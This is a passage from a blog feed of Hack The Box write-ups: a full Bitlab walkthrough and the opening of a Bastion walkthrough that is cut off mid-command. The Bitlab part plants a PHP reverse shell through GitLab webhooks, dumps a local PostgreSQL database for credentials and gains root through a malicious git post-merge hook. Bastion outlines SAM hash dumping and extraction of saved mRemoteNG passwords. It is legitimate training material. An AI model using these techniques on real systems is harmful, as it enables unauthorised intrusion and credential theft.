&lt;p&gt;I&amp;rsquo;d like to thank the CyberSpace Kenya team for putting up the challenge as well as &lt;a href=&#34;https://twitter.com/ZuluMeats&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ZuluMeats&lt;/a&gt;

 for the prize.&lt;/p&gt;
&lt;p&gt;You can find more challenges on their website: &lt;a href=&#34;https://ctf.cyberspace.co.ke&#34;&gt;https://ctf.cyberspace.co.ke&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;For any questions you can reach me on Twitter.&lt;/p&gt;
&lt;p&gt;Twitter: &lt;a href=&#34;https://twitter.com/ikuamike&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ikuamike&lt;/a&gt;

&lt;/p&gt;
&lt;p&gt;Github: &lt;a href=&#34;https://github.com/ikuamike&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ikuamike&lt;/a&gt;

&lt;/p&gt;</content>
    </item>
    
    <item>
      <title>Hack The Box: Bitlab</title>
      <link>https://blog.ikuamike.io/posts/2020/bitlab-htb/</link>
      <pubDate>Sat, 11 Jan 2020 00:00:00 +0000</pubDate>
      
      <guid>https://blog.ikuamike.io/posts/2020/bitlab-htb/</guid>
      <description></description>
      <content>&lt;img src=&#34;https://blog.ikuamike.io/img/bitlab/info_card.png&#34;  alt=&#34;Bastion Info Card&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
&lt;p&gt;As the name suggests this box had a instance of gitlab where the initial foothold involves getting credentials from obfuscated javascript and once logged into the gitlab instance we abuse webhooks to add our own code and execute it to get a reverse shell. Read on to see how I able to root the box.&lt;/p&gt;
&lt;h1 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h1&gt;
&lt;p&gt;As usual I start with a quick nmap scan to find open ports and then run a second scan for service and version detection.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nmap -sS -p- --min-rate&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt; 10.10.10.114

Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.10.10.114
Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.21s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;65533&lt;/span&gt; filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Thorough scan:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nmap -Pn -sC -sV -p 22,80 -oA nmap/bitlab 10.10.10.114

Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.10.10.114
Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.47s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu Linux; protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
| ssh-hostkey:
|   &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt; a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;RSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ECDSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|_  &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; c9:54:3d:91:01:78:03ð16:14:6b:cc:f0:b7:3a:55 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ED25519&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
80/tcp open  http    nginx
| http-robots.txt: &lt;span style=&#34;color:#ae81ff&#34;&gt;55&lt;/span&gt; disallowed entries &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt; shown&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
| / /autocomplete/users /search /api /admin /profile
| /dashboard /projects/new /groups/new /groups/*/edit /users /help
|_/s/ /snippets/new /snippets/*/edit
|_http-server-header: nginx
| http-title: Sign in &lt;span style=&#34;color:#ae81ff&#34;&gt;\x&lt;/span&gt;C2&lt;span style=&#34;color:#ae81ff&#34;&gt;\x&lt;/span&gt;B7 GitLab
|_Requested resource was http://10.10.10.114/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;gitlab&#34;&gt;Gitlab&lt;/h2&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/bitlab/bitlab-01.png&#34;  alt=&#34;gitlab instance&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;After trying out some simple combinations of username and password that didn&amp;rsquo;t work I decided to click on links on the home page and see if I&amp;rsquo;ll get a version number. When I opened the help link I got this.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/bitlab/bitlab-02.png&#34;  alt=&#34;gitlab instance&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;In bookmarks.html the links were normal apart from the last one which was javascript.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/bitlab/bitlab-03.png&#34;  alt=&#34;gitlab instance&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;!-- raw HTML omitted --&gt;
&lt;p&gt;The deobfuscated javascript shows a username and password.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;javascript&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; ()
{
	&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_0x4b18&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;value&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;user_login&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;getElementById&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;clave&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;user_password&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;11des0081x&amp;#34;&lt;/span&gt;];
	document[&lt;span style=&#34;color:#a6e22e&#34;&gt;_0x4b18&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]](&lt;span style=&#34;color:#a6e22e&#34;&gt;_0x4b18&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])[&lt;span style=&#34;color:#a6e22e&#34;&gt;_0x4b18&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_0x4b18&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;];
	document[&lt;span style=&#34;color:#a6e22e&#34;&gt;_0x4b18&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]](&lt;span style=&#34;color:#a6e22e&#34;&gt;_0x4b18&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;])[&lt;span style=&#34;color:#a6e22e&#34;&gt;_0x4b18&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_0x4b18&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;];
})()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After logging in there are two projects.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/bitlab/bitlab-04.png&#34;  alt=&#34;gitlab instance&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;My user has Developer role on the Profile repo and Reporter role on the Deployer repo. I can&amp;rsquo;t edit the deployer but looking at the files the readme has a link about gitlab webhooks.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/bitlab/bitlab-05.png&#34;  alt=&#34;gitlab instance&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;In the index.php the part that caught my eye is the if statement. If that condition is true, a command to change directory is run and then a git pull.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/bitlab/bitlab-06.png&#34;  alt=&#34;gitlab instance&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Based on the name of the script we can guess it deploys changes made to the profile repo after a merge request is made. Since it pulls to /profile this is probably the directory where it&amp;rsquo;s hosted. We can verify this by going to /profile.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/bitlab/bitlab-07.png&#34;  alt=&#34;gitlab instance&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h3 id=&#34;getting-shell&#34;&gt;Getting Shell&lt;/h3&gt;
&lt;p&gt;I&amp;rsquo;ll add a php file to the profile repo that will give me a reverse shell on the server. I will need to also create a pull request with my new file and merge it, this will create a webhook to the deployer script and it will download it on the web server, allowing me to execute it.&lt;/p&gt;
&lt;p&gt;Adding reverse shell php file:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/bitlab/bitlab-08.png&#34;  alt=&#34;gitlab instance&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Merging the request:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/bitlab/bitlab-09.png&#34;  alt=&#34;gitlab instance&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;The file is successfully added to master branch:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/bitlab/bitlab-10.png&#34;  alt=&#34;gitlab instance&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Finally got my shell by visiting 10.10.10.114/profile/shell.php on my browser:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/bitlab/bitlab-11.png&#34;  alt=&#34;gitlab instance&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;getting-user&#34;&gt;Getting User&lt;/h2&gt;
&lt;p&gt;The user.txt is only readable the clave user. After a bit of local enumeration and getting stuck I decided to go back to the gitlab instance to see if I may have missed anything. I found a snippet mentioning postgresql and a db connection script.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/bitlab/bitlab-12.png&#34;  alt=&#34;gitlab instance&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Checking on the server we indeed have a postgresql instance running locally on port 5432.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/bitlab/bitlab-13.png&#34;  alt=&#34;gitlab instance&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;After some tweaking I was able to get a script working that would read the db.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;

   $host        &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;host = 127.0.0.1&amp;#34;&lt;/span&gt;;
   $port        &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;port = 5432&amp;#34;&lt;/span&gt;;
   $dbname      &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dbname = profiles&amp;#34;&lt;/span&gt;;
   $credentials &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;user = profiles password=profiles&amp;#34;&lt;/span&gt;;

   $db &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pg_connect&lt;/span&gt;( &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$host&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$port&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$dbname&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$credentials&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;  );

   &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;$db) {
      &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Error : Unable to open database&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
   } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
      &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Opened database successfully&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
   }

   $sql &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;EOF&lt;/span&gt;
      &lt;span style=&#34;color:#a6e22e&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;profiles&lt;/span&gt;;
&lt;span style=&#34;color:#a6e22e&#34;&gt;EOF&lt;/span&gt;;

   $ret &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pg_query&lt;/span&gt;($db, $sql);
   &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;$ret) {
      &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pg_last_error&lt;/span&gt;($db);
      &lt;span style=&#34;color:#66d9ef&#34;&gt;exit&lt;/span&gt;;
   }

   &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt;($row &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pg_fetch_row&lt;/span&gt;($ret)) {
      &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $row[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $row[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $row[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
   }

   &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Operation done successfully&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
   &lt;span style=&#34;color:#a6e22e&#34;&gt;pg_close&lt;/span&gt;($db);
&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In the db I found a password which appears to be base64 encoded but the trick was to use it as it is and not decode it for it to work.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/bitlab/bitlab-15.png&#34;  alt=&#34;gitlab instance&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;getting-root&#34;&gt;Getting Root&lt;/h2&gt;
&lt;p&gt;This part was interesting as I had never heard of this technique before. The user www-data had sudo rights to run git pull.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/bitlab/bitlab-16.png&#34;  alt=&#34;gitlab instance&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;In git there are scripts called git hooks which can run automatically before or after git actions like commits. You can configure them in .git/hooks. For this case I&amp;rsquo;ll use &lt;strong&gt;post-merge&lt;/strong&gt; since when git pull is run a merge action is done.&lt;/p&gt;
&lt;p&gt;Since we can&amp;rsquo;t edit the current folder copy the profile repo to a world writeable directory like /tmp and create the post-merge script in hooks, the script will give a reverse shell.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;cp -r /var/www/html/profile /tmp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/bitlab/bitlab-17.png&#34;  alt=&#34;gitlab instance&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;After making this file executable, we just have to make any change to the repo on the gitlab instance like creating a txt file and make sure we merge it to master. Once that is done, we can run sudo git pull and get a root reverse shell.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/bitlab/bitlab-18.png&#34;  alt=&#34;gitlab instance&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;As you may have noticed since we used the www-data user to get root, we would have skipped the getting user path using the postgresql db and read user.txt from the root user.&lt;/p&gt;</content>
    </item>
    
    <item>
      <title>Hack The Box: Bastion</title>
      <link>https://blog.ikuamike.io/posts/2019/bastion-htb/</link>
      <pubDate>Fri, 06 Sep 2019 00:00:00 +0000</pubDate>
      
      <guid>https://blog.ikuamike.io/posts/2019/bastion-htb/</guid>
      <description></description>
      <content>&lt;img src=&#34;https://blog.ikuamike.io/img/bastion/info_card.png&#34;  alt=&#34;Bastion Info Card&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
&lt;p&gt;Bastion was a relatively easy box. There is an smb share is accessible without credentials and inside there is a backup drive that we can mount and access. From the drive we can dump the SAM file and crack it to get login credentials. Once logged in we find mRemoteNG installed and extract its saved passwords to get admin access.&lt;/p&gt;
&lt;h1 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h1&gt;
&lt;p&gt;I start with this nmap command to quickly find open ports.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nmap -sS -p- --min-rate&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt; 10.10.10.134

Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.10.10.134
Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.23s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;65522&lt;/span&gt; closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then run a thorough service scan on the discovered ports.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nmap -sC -sV -p 22,135,139,445,5985,47001 -oA nmap/bastion 10.10.10.134

Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.10.10.134
Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.22s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.

PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH for_Windows_7.9 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
| ssh-hostkey:
|   &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt; 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;RSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; cc:2e:56ð19:97:d5:bb:03:fb:82ð¿63:da:68:01 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ECDSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|_  &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ED25519&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server &lt;span style=&#34;color:#ae81ff&#34;&gt;2016&lt;/span&gt; Standard &lt;span style=&#34;color:#ae81ff&#34;&gt;14393&lt;/span&gt; microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OSs: Windows, Windows Server &lt;span style=&#34;color:#ae81ff&#34;&gt;2008&lt;/span&gt; R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -42m39s, deviation: 1h09m15s, median: -2m40s
| smb-os-discovery:
|   OS: Windows Server &lt;span style=&#34;color:#ae81ff&#34;&gt;2016&lt;/span&gt; Standard &lt;span style=&#34;color:#ae81ff&#34;&gt;14393&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Windows Server &lt;span style=&#34;color:#ae81ff&#34;&gt;2016&lt;/span&gt; Standard 6.3&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|   Computer name: Bastion
|   NetBIOS computer name: BASTION&lt;span style=&#34;color:#ae81ff&#34;&gt;\x&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt;
|   Workgroup: WORKGROUP&lt;span style=&#34;color:#ae81ff&#34;&gt;\x&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt;
|_  System time: 2019-09-06T13:28:45+02:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;dangerous, but default&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-09-06 12:28:49
|_  start_date: 2019-09-06 11:58:13

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;smb&#34;&gt;SMB&lt;/h2&gt;
&lt;p&gt;Based on the open ports the best service to check out first is smb.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;smbmap -H 10.10.10.134 -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;

